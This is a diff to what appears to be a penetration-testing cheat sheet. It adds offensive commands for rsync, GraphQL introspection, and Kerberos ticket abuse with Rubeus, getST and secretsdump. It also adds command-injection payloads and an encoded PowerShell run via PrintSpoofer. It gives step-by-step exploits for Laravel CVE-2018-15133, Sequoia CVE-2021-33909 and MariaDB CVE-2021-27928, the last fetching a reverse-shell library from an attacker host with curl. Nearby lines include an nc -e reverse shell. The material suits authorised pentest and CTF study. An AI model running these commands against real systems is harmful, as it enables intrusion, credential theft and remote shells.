@@ -177,7 +177,7 @@ onesixtyone -c /path/to/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i ip.txt
 
 ```bash
 # Nmap
-nmap -n -sV --script "ldap * and not brute" 10.10.10.10
+nmap -n -sV --script "ldap* and not brute" 10.10.10.10
 
 # LdapSearch
 ldapsearch -h 10.10.10.10 -x -b 'DC=bank,DC=local' -s sub
@@ -186,6 +186,21 @@ ldapsearch -x -h 10.10.10.10 -D 'BANK\nik' -w 'Password@123!' -b 'CN=Users,DC=ba
 ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
 ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local' | grep -i <user> -C 40
 
+```
+
+### 873 (Rsync)
+
+```bash
+# Nmap
+nmap -sV --script "rsync-list-modules" -p 873 10.10.10.10
+
+# Command
+rsync -av --list-only rsync://10.10.10.10/Modules
+rsync -av rsync://10.10.10.101/Conf ./shared
+rsync -av ./test.txt rsync://10.10.10.10/Modules/test.txt
+
+# References
+https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
 ```
 
 ### 1433 (MSSQL)
@@ -458,6 +473,21 @@ select * from user;
 UPDATE user SET passwd = "" where id 2;
 ```
 
+### GraphQL Injection
+
+```bash
+# Introspection
+{"query":"{\r\n      __schema {\r\n        queryType { name }\r\n        mutationType { name }\r\n        subscriptionType { name }\r\n        types {\r\n          ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n          ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n      interfaces {\r\n        ...TypeRef\r\n      }\r\n      enumValues(includeDeprecated: true) {\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n      name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n              kind\r\n              name\r\n              ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }"}
+
+# Query
+{"query":"{\r\n    AllNotes\r\n   {\r\n   id,author,title\r\n   }\r\n   }"}
+
+# References
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
+https://apis.guru/graphql-voyager/
+```
+
+
 ### Hydra
 
 ```bash
@@ -703,6 +733,11 @@ https://www.codeguru.com/columns/kate/.net-website-security-guidelines-checklist
 '$(nc -e /bin/bash 192.168.149.129 4444)'
 "$(printf 'aaa\n/bin/sh\nls')"
 () { :;}; /bin/bash
+
+# Date
+%H:%M:%S';cat ../flag;#
+%H';date -f '../flag
+%H' -f '../flag
 ```
 
 ### Socat
@@ -712,6 +747,13 @@ socat tcp-listen:8009,fork tcp:192.168.56.104:8009 &
 socat tcp-listen:8080,fork tcp:192.168.56.104:8080 &
 socat tcp-listen:34483,fork tcp:192.168.56.104:34483 &
 socat tcp-listen:4321,fork tcp:192.168.56.104:4321 &
+```
+
+### tcpdump
+
+```bash
+# Command
+tcpdump -i lo -w /tmp/write.pcap
 ```
 
 ### Chisel
@@ -727,6 +769,9 @@ https://github.com/jpillora/chisel
 
 ## Attacker Machine
 ./chisel server -p 8000 --reverse
+
+# Add this in /etc/proxychains4.conf
+socks5 127.0.0.1 1080
 ```
 
 ### Ping Sweep
@@ -929,7 +974,7 @@ for i in $(cat ip.txt); do echo "["$i"]" >> port.txt; echo "" >> port.txt;echo $
 https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
 
 # Usage
-Seatbelt.exe all
+Seatbelt.exe -group=all
 ```
 
 ### File Transfer
@@ -1197,6 +1242,24 @@ alias hex='xxd -p'
   * while read line; do echo $line | hex | tr "\n" " " | sed 's/ //g';echo; done < payload.txt
 ```
 
+### Pentest
+
+```bash
+=> User Enumeration
+$ https://www.vaadata.com/blog/user-enumerations-on-web-applications/
+$ https://www.rapid7.com/blog/post/2017/06/15/about-user-enumeration/
+
+=> Directory Listing
+$ https://cwe.mitre.org/data/definitions/548.html
+
+=> File upload
+$ https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+
+=> SQL Injection
+$ https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+
+```
+
 ### PowerShell Commands
 
 ```powershell
@@ -1232,6 +1295,17 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 # Read /etc/hosts (Remove # - Comments)
 (Get-Content C:\Windows\System32\drivers\etc\hosts | Where { $_ -notmatch [char]94+[char]35 }).Trim()
+
+# List commandline process
+wmic process list full | findstr /I commandline | Sort-Object -Unique
+wmic process list full | findstr /I commandline | Sort-Object -Unique | Select-String -Pattern "password"
+$test=[char]117+[char]114+[char]108;wmic process list full | findstr /I commandline |Sort-Object -Unique | Select-String -Pattern $test
+
+# Exclude String
+type text.txt | Select-String -Pattern "food|eat" -NotMatch
+
+# List Firewall Settings
+netsh firewall show state
 
 # View lnk files information
 $sh = New-Object -COM WScript.Shell
@@ -1281,6 +1355,13 @@ neo4j:neo4j
 
 ```
 
+### Red Team References
+
+```bash
+# References
+https://www.vincentyiu.com/red-team-tips
+https://vysecurity.rocks/
+```
 
 ### Rubeus
 ```bash
@@ -1290,10 +1371,16 @@ https://github.com/GhostPack/Rubeus
 # Commands
 .\Rubeus.exe asreproast  /format:hashcat /outfile:ou.txt
 .\Rubeus.exe kerberoast /outfile:ou.txt
+.\Rubeus.exe asktgs /ticket:<base64.txt> /service:MSSQL\DC01.MEGACORP.LOCAL
+.\Rubeus.exe hash /user:nik /domain:BANK /password:password
 .\Rubeus dump
 	* [IO.File]::WriteAllBytes("C:\users\administrator\downloads\ticket.kirbi", [Convert]::FromBase64String("<base64 longer>"))
 	* .\Rubeus.exe ptt /ticket:ticket.kirbi
 	* .\PsExec64.exe -accepteula \\bank.local -u nikk cmd 
+.\Rubeus.exe s4u /user:nk /rc4:238F7038FD4BBC3293D8E75566DF4D65 /impersonateuser:administrator /msdsspn:"MSSQL/DC01.BANK.LOCAL" /altservice:cifs,http,host,mssql,mssqlsvc,ldap,krbtgt /ptt
+.\Rubeus.exe dump /nowrap
+    * [IO.File]::WriteAllBytes("C:\users\nik\downloads\cifs.kirbi", [Convert]::FromBase64String("<BASE64>"))
+    * ticketConverter.py cifs.kirbi cifs.ccache
 ```
 
 ### Covenant
@@ -1383,11 +1470,31 @@ pypykatz lsa minidump lsass.dmp
 pypykatz registry --sam sam system
 ```
 
+### DomainPasswordSpray.ps1
+
+```bash
+# Command
+
+
+# References
+https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
+```
+
 ### Httpx
 
 ```bash
 # Install
 GO111MODULE=on go get -v github.com/projectdiscovery/httpx/cmd/httpx
+```
+
+### Stabilize
+
+```bash
+=> Ways
+$ script -qc /bin/bash /dev/null
+$ python -m 'import pty;pty.spawn("/bin/bash"))'
+$ python3 -m 'import pty;pty.spawn("/bin/bash"))'
+$ Ctrl + z @ stty -raw echo;fg
 ```
 
 ### Crackmapexec
@@ -1398,6 +1505,7 @@ docker pull byt3bl33d3r/crackmapexec
 docker run -it --entrypoint=/bin/sh --name crackmapexec byt3bl33d3r/crackmapexec
 docker start crackmapexec
 docker exec -it crackmapexec sh
+docker cp /var/lib/docker/volumes/data/_data/EMPLOYEE.FDB firebird:/firebird/data/EMPLOYEE2.FDB
 ```
 
 ### Impacket Tools
@@ -1414,11 +1522,16 @@ GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outpu
 GetADUsers.py -all bank.local/nik:'Password@123!'-dc-ip 10.10.10.10
 
 # secretsdump.py
+export KRB5CCNAME=Administrator.ccache
+secretsdump.py -k DC01.bank.local -just-dc
 secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
 secretsdump.py -ntds ntds.dit -system system local
 secretsdump.py -ntds ntds.dit -system system local -history
 secretsdump.py -sam SAM -system SYSTEM local
 secretsdump.py -ntds ntds.dit -system system.hive local -outputfile dump.txt
+
+# getST.py
+getST.py -spn MSSQL/DC01.BANK.LOCAL 'BANK.LOCAL/nik:password' -impersonate Administrator -dc-ip 10.10.10.10
 
 # wmiexec.py
 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
@@ -1434,7 +1547,8 @@ smbclient.py bank.local/nik:'Password@123'@10.10.10.10
 # mssqlclient.py
 mssqlclient.py  -windows-auth bank.local/aniq:'Password@123'@10.10.10.10
 
-
+# ticketConverter.py
+ticketConverter.py cifs.kirbi cifs.ccache
 ```
 
 ### Git-LFS
@@ -1539,6 +1653,22 @@ Link : https://github.com/BushidoUK/CTI-Lexicon/blob/main/Lexicon.md
 - http://waifu2x.udp.jp/
 ```
 
+### printerbug.py
+
+```bash
+# Commands
+
+# References
+https://github.com/dirkjanm/krbrelayx
+```
+
+### Vboxmanage.exe
+
+```bash
+# Commands
+.\VboxMange.exe -nologo guestcontrol "Docker" run -exe "/bin/bash" --username "nik" --password "password123" --wait-stdout -- bash -c '/usr/bin/echo "oassword123" | sudo -S cat /etc/passwd 2>/dev/null'
+```
+
 ### Powerview.ps1
 
 ```code
@@ -1548,6 +1678,7 @@ git clone https://github.com/PowerShellMafia/PowerSploit.git
 # Commands
 Get-DomainComputer
 Get-DomainComputer -properties name
+Get-DomainComputer -Unconstrained -Properties useraccountcontrol,dnshostname | fl
 Get-DomainTrustMapping -Verbose
 Get-DomainTrust
 Get-NetForest
@@ -1701,91 +1832,95 @@ https://github.com/hahwul/dalfox
 ### PowerUpSQL.ps1
 
 ```code
-# Commands
-Get-SQLInstanceLocal -Verbose
-Get-SQLInstanceDomain -Verbose
-Get-SQLServerInfo -Verbose -Instance query.bank.local
-Invoke-SQLAudit -Verbose -Instance query.bank.local
-Get-SQLQuery -instance query.bank.local -query "select * from master..sysservers"
+=> Commands
+$ Get-SQLInstanceLocal -Verbose
+$ Get-SQLInstanceDomain -Verbose
+$ Get-SQLServerInfo -Verbose -Instance query.bank.local
+$ Invoke-SQLAudit -Verbose -Instance query.bank.local
+$ Get-SQLQuery -instance query.bank.local -query "select * from master..sysservers"
 
-# References
-https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
+=> References
+$ https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
 ```
 
 ### PowerUp.ps1
 
 ```bash
-# Download
-iex(iwr -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1))
+=> Download
+$ iex(iwr -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1))
 
-# Command
-Invoke-AllChecks
-Find-ProcessDLLHijack
+=> Command
+$ Invoke-AllChecks
+$ Find-ProcessDLLHijack
 
-# References
-https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+=> References
+$ https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
 ```
 
 ### Windows Vulnerable Machine (Setup/Ready)
 
 ```bash
-# References
-- https://github.com/RedTeamOperations/Vulnerable_Machine/blob/master/Escalate%20-%20A%20Windows%20Vulnerable%20Virtual%20Machine
-- https://github.com/Tib3rius/Windows-PrivEsc-Setup
+=> References
+$ https://github.com/RedTeamOperations/Vulnerable_Machine/blob/master/Escalate%20-%20A%20Windows%20Vulnerable%20Virtual%20Machine
+$ https://github.com/Tib3rius/Windows-PrivEsc-Setup
 ```
 
 ### Linux Vulnerable Machine (Setup/Ready)
 
 ```bash
-# References
-- https://github.com/RedTeamOperations/Vulnerable_Machine/blob/master/Escalate%20-%20A%20Linux%20Vulnerable%20Virtual%20Machine
+=> References
+$ https://github.com/RedTeamOperations/Vulnerable_Machine/blob/master/Escalate%20-%20A%20Linux%20Vulnerable%20Virtual%20Machine
 
 ```
 
 ### Inveigh
 
 ```bash
-# Commands
-Invoke-InveighRelay -ConsoleOutput -Y -StatusOutput N -Command "net user commandtest Passw0rd123! /add" -Attack Enumerate,Execute,Session
-Invoke-Inveigh -ConsoleOutput Y
-Stop-Inveigh
-Invoke-Inveigh -FileOutput Y
+=> Commands
+$ Invoke-InveighRelay -ConsoleOutput -Y -StatusOutput N -Command "net user commandtest Passw0rd123! $ /add" -Attack Enumerate,Execute,Session
+$ Invoke-Inveigh -ConsoleOutput Y
+$ Stop-Inveigh
+$ Invoke-Inveigh -FileOutput Y
 ```
 ### Metasploit
 
 ```
-# Set Proxies
-set PROXIES HTTP:127.0.0.1:8080
-set ReverseAllowProxy true
+=> Set Proxies
+$ set PROXIES HTTP:127.0.0.1:8080
+$ set ReverseAllowProxy true
 
-# Mimikatz
-load mimikatz
+=> Mimikatz
+$ load mimikatz
 
-# Commands
-ps
-help
+=> Commands
+$ ps
+$ help
 
-# Msfvenom
-msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f raw -o shell.php
+=> Msfvenom
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f raw -o shell.php
 ```
 
 ### Nessus
 
 ```bash
-# Download
-https://www.tenable.com/downloads/nessus
+=> Download
+$ https://www.tenable.com/downloads/nessus
 
-# Install
-sudo apt install ./Nessus-8.14.0-debian6_amd64.deb
+=> Install
+$ sudo apt install ./Nessus-8.14.0-debian6_amd64.deb
 
-# Start
-sudo /bin/systemctl start nessusd.service
+=> Start
+$ sudo /bin/systemctl start nessusd.service
 
-# Stop
-sudo /bin/systemctl stop nessusd.service
+=> Stop
+$ sudo /bin/systemctl stop nessusd.service
 
-# Web
-https://localhost:8834/
+=> Web
+$ https://localhost:8834/
+
+=> No PDF?
+$ Install Java on the machine 
+$ Follow the steps in here : https://community.tenable.com/s/article/PDF-Option-is-Missing-in-Nessus
 ```
 
 ### CobaltStrikeParser
@@ -1902,6 +2037,7 @@ https://github.com/GhostManager/Ghostwriter
 # Command
 sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
 sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"
+sqlmap -r post.req --level=5 --risk=3 --os-shell
 ```
 
 ### Nim
@@ -2308,6 +2444,14 @@ getmyuid
 
 ```
 
+### Firebird
+
+```bash
+# Commands
+
+# References
+```
+
 # C. SUID/CAP/SUDO/GROUP
 
 ### Python
@@ -2629,6 +2773,7 @@ wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
 PrintSpoofer.exe -i -c cmd
 .\PrintSpoofer.exe -i -c "whoami"
 .\PrintSpoofer.exe -i -c "powershell ls"
+.\PrintSpoofer.exe -i -c "powershell.exe -e YwBhAHQAIAAvAHUAcwBlAHIAcwAvAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIALwBkAGUAcwBrAHQAbwBwAC8AcgBvAG8AdAAuAHQAeAB0AA=="
 
 # Technique 2
 ##First
@@ -2847,6 +2992,31 @@ $6$Zwdp3uo2Hg1HUvlc$wYEAwd5o9C5xQ1yX97izpRp/IhH4Dk1BzgprmQmK2P9/GnYTCIxzpF63/jel
 
 # Commands
 su root
+```
+
+### Laravel Remote Code Execution (CVE-2018-15133)
+
+```bash
+# Step By Step
+1. Get APP_KEY
+* APP_KEY=base64:d2PlewM8mV4bhlJZQTqvatC3XWexy+AlMqUwCP6YuKg=
+2. Use phpgc (Command)
+* ./phpggc Laravel/RCE1 system "id" -b
+* ./phpggc Laravel/RCE2 system "id" -b
+* ./phpggc Laravel/RCE3 system "id" -b
+* ./phpggc Laravel/RCE4 system "id" -b
+* ./phpggc Laravel/RCE5 system "id" -b
+* ./phpggc Laravel/RCE6 system "id" -b
+* ./phpggc Laravel/RCE7 system "id" -b
+3. Use the CVE php script
+* ./cve-2018-15133.php <base64encoded_APP_KEY> <base64encoded-payload>
+4. Put it in cookie (POST)
+
+# Notes
+-> Remember on gadgetchains/Laravel/RCE, there is others that you can try
+
+# References
+https://github.com/kozmic/laravel-poc-CVE-2018-15133
 ```
 
 ### OpenSMPTD < 6 (Local Privesc)
@@ -3127,6 +3297,43 @@ print(s.recv(1024))
 https://medium.com/swlh/tryhackme-buffer-overflow-prep-9b2ece17a13c
 https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/
 https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice.git
+```
+
+### Sequoia (CVE-2021-33909)
+
+```bash
+# Download
+https://github.com/AmIAHuman/CVE-2021-33909
+
+# Usage
+gcc exploit.c -o exploit
+chmod +x exploit
+./exploit
+
+# References
+https://blog.qualys.com/vulnerabilities-threat-research/2021/07/20/sequoia-a-local-privilege-escalation-vulnerability-in-linuxs-filesystem-layer-cve-2021-33909
+https://github.com/AmIAHuman/CVE-2021-33909
+```
+
+### MariaDB (CVE-2021-27928)
+
+```
+# Steps
+1. Set Payload
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f elf-so -o shell.so
+
+2. Transfer to Target
+curl 10.10.10.10/shell.so -o /tmp/shell.so
+
+3. Listen 
+nc -lnvp 1234
+
+4. Execute the payload
+mysql -u root -p 
+SET GLOBAL wsrep_provider="/tmp/shell.so";
+
+# References
+https://github.com/Al1ex/CVE-2021-27928
 ```
 
 # E. CMS/Web/Application
